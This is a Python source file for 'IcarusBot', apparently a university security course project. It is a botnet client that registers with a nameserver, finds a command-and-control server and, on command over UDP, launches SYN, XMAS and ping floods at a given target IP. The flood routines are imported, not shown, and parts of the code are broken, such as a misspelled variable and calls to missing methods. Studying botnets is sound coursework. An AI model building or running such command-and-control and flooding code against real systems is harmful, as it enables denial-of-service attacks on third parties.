# Keen to start
import signal
import socket
import json
import threading
import time
from enum import Enum
from socket import timeout
import syn_flood, xmas_attack, ping_flood

import requests
from win10toast import ToastNotifier

from config import API_URL

BOT_ID_NAME = ''  # Replace this for each new bot handed out.
NUM_PACKETS_TO_SEND = 1


class IcarusBot:
    """
    A class used to represent the bot
    """

    def __init__(self):
        """
                The process of the init is:
                    1. Setup basics
                    2. Start updating with nameserver (let it know we exist) as a separate 'Thread'
                    3. Ask the nameserver where the active C2 server is. It will continue asking every 5 seconds until told.
                    4. It will then bind with the ip::port of the C2, then sending a basic status update.
                    5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
                        5.1: Refer to the main_loop() function for details about how it handles the protocol.
        """
        file = open("bot_name.txt", "r")
        global BOT_ID_NAME
        BOT_ID_NAME = file.read()
        print(BOT_ID_NAME, "IS RUNNING")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
        self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
        self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
        self.c2_server_details = ()

        self.status = 'STARTED'
        self.attack_runtime = 0  # Used for tracking duration of attack.
        self.target_ip = ''


        # This will constantly run and update with the nameserver.
        threading.Thread(target=self.update_with_nameserver, daemon=True).start()
        # Now we go and look for the C2 server.

        notification(self.status)
        while True:
            print("contacting nameserver")
            nameserver_available = False
            # This will loop until the nameserver has an answer.
            while not nameserver_available:
                self.c2_server_details = tuple(requests.get(f'{API_URL}/api/lookup/c2').text.split("::"))
                print(self.c2_server_details)
                if self.c2_server_details[0] != 'not_active' and self.c2_server_details[1] != 'not_active':
                    # there is a server available, let's go ahead and connect, ignoring the nameserver again until they disconnect.
                    nameserver_available = True
                time.sleep(5)
            # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
            print("nameserver found")
            notification("CONNECTED")
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
            self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
            self.main_loop()
            # This means that the C2 server has been inactive, so we restart the process of searching for the next C2 server.
            self.sock.close()

    def exit_gracefully(self, signum, frame):
        """handle bot exit gracefully"""
        print("\\EXITING WITH SIGNAL", signum)
        self.update_thread.cancel()

    def update_with_nameserver(self):
        """
        Sleeps for 2 seconds before notifying with the nameserver of its presence.
        The nameserver will kick us off after 30 seconds of inactivity, so 2 seconds seems ok.
        """
        while True:
            time.sleep(2)
            # We don't care about the outcome.
            r = requests.post(f'{API_URL}/api/lookup/bot/update',
                              json={'id': self.bot_id, 'ip': self.ip, 'port': 25565})

    def main_loop(self):
        """
        This functions works as following: (1.1 for success, 1.2 for timeout)
            1. Listen for a request
                1.1 Receives a request, splits it into request, determines the status
                1.2 If it's status, respond with the status
                1.3 If it's attack, start the attack, respond with the status and details about the attack (type, ip, runtime)
                1.4 If it's stop, stop the attack and respond with the new status
            2. If it times out (30 seconds)
                2.1 disconnect with the webserver and ignore it.
                2.2 Go back to asking the nameserver for a IP address for a C2 server.
        """
        self.status = 'IDLE'

        # Now we notify the bot of our existence
        init_message = {
            'ip': self.ip,
            'status': self.status,
            'id': self.bot_id,
            'runtime': self.attack_runtime,
            'target': self.target_ip
        }
        init_message = json.dumps(init_message)
        self.sock.sendto(str.encode(init_message), (self.c2_server_details[0], int(self.c2_server_details[1])))

        # Now we just listen for message requests.
        while True:
            try:
                # We now interact with this like any other object.
                self.sock.settimeout(10)
                jsonMsg = json.loads(self.sock.recv(4096).decode('ascii'))
                print(jsonMsg)
                request_type = jsonMsg['request']
                attack_type = jsonMsg['attack']
                target_ip = jsonMsg['targetIP']
                # These are contained in all packets, irrespective of status/attack/stop call.
                ports = jsonmsg['ports']
                runtime = jsonMsg['runtime']
                response = ''
                # Through each if statement, we specify what we're going to do. The logic is contained in each if.
                if request_type == 'status':
                    # All requests go through this response.
                    response = {
                        'ip': self.ip,
                        'status': self.status,
                        'id': self.bot_id,
                        'runtime': self.attack_runtime,
                        'target': self.target_ip
                    }
                    response = json.dumps(response)
                elif request_type == 'attack':
                    # TODO: Implement attacks here
                    # TODO: Number of packets to send?
                    # Angus: We just keep running until a stop attack is issued.
                    # TODO: Specify port(s) to attack
                    if attack_type == 'SYN_FLOOD':
                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
                        #attack_thread.start()
                        #attack_thread.join()
                        syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, [1])
                    elif attack_type == 'XMAS_FLOOD':
                        xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, [1])
                    elif attack_type == 'PING_FLOOD':
                        ping_flood.PING_Flood(target_ip, NUM_PACKETS_TO_SEND)
                    else:
                        print("No attack type specified")

                # This will then send the message back to the server, irrespective of the flag.
                time.sleep(2)
                self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
            except timeout or Exception:
                # the server has lagged out
                print("timeout")
                return

    #
    # def lookup(self):
    #     """sends request to nameserver to get command ip and port"""
    #     r = requests.get(f'{API_URL}/api/lookup/bot/{self.bot_id}')
    #     if (r.status_code == 200):
    #         self.command_ip, self.command_port = r.text.split('::')
    #         print(self.command_ip)
    #         print(self.command_port)
    #
    # def update(self):
    #     """updates nameserver with ip and port"""
    #     self.update_thread.start()

    #
    # def start(self):
    #     self.update()
    #
    # def notification(self, param):
    #     pass


def notification(action):
    """opens windows notification"""
    toast = ToastNotifier()
    title = ""
    body = ""
    if action == "STARTED":
        title = "ICARUS BOT STARTED"
        body = "I NOW HAVE FULL ACCESS TO YOUR SYSTEMS (COMS4507)"
    elif action == "CONNECTED":
        title = "ICARUS CONNECTED TO C2 SERVER"
        body = "NOTHING TO WORRY ABOUT"
    elif action == "ATTACKING":
        title = "ICARUS BOT ATTACKING"
        body = "I AM ATTACKING. PLEASE IGNORE."
    elif action == "STOPPED":
        title = "ICARUS IS DONE ATTACKING"
        body = "I AM DONE ATTACKING. PLEASE IGNORE."
    else:
        title = "ICARUS BOT CALLED OFF"
        body = "The bot finished it's job"

    toast.show_toast(
        title,
        body,
        icon_path="icarus.ico",
        duration=5,
        threaded=True,
    )


def main():
    bot = IcarusBot()
    bot.notification(True)
    bot.start()


if __name__ == "__main__":
    main()
